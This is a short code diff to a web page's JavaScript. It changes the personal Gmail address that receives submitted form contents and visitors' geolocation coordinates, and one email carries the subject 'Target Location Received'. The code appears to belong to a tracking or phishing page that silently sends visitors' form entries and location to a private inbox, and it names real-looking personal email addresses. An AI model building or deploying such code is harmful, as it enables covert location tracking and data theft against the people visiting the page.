@@ -23,7 +23,7 @@ document.addEventListener("DOMContentLoaded", function () {
             const formData = new FormData(form);
             const data = Object.fromEntries(formData.entries());
 
-            sendEmail("Form Submission", JSON.stringify(data, null, 2), "khalilrodini@gmail.com");
+            sendEmail("Form Submission", JSON.stringify(data, null, 2), "khalilbravi610@gmail.com");
         });
     }
 });
@@ -37,7 +37,7 @@ function handleLocationSuccess(position) {
     locationDisplay.textContent = `Latitude: ${latitude}, Longitude: ${longitude}`;
     console.log(`Location received: Latitude ${latitude}, Longitude ${longitude}`);
 
-    sendEmail("Target Location Received", `Latitude: ${latitude}, Longitude: ${longitude}`, "khalilrodini@gmail.com");
+    sendEmail("Target Location Received", `Latitude: ${latitude}, Longitude: ${longitude}`, "khalilbravi610@gmail.com");
 }
 
 // Handle geolocation errors
@@ -63,7 +63,7 @@ function handleLocationError(error) {
     locationDisplay.textContent = errorMessage;
     console.log("Geolocation error:", errorMessage);
 
-    sendEmail("Location Access Error", errorMessage, "khalilrodini@gmail.com");
+    sendEmail("Location Access Error", errorMessage, "khalilbravi610@gmail.com");
 }
 
 // Send email function
